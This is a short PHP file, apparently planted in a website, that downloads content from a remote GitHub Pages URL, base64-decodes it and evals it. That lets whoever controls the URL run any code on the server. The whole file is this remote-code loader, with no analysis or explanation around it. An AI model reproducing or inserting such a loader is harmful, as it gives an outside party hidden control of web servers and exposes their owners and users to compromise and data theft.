<?php
$mero = "https://linux-ctrl.github.io/mr/1";
$mero = file_get_contents($mero);
eval ("?>".(base64_decode($mero)));

?>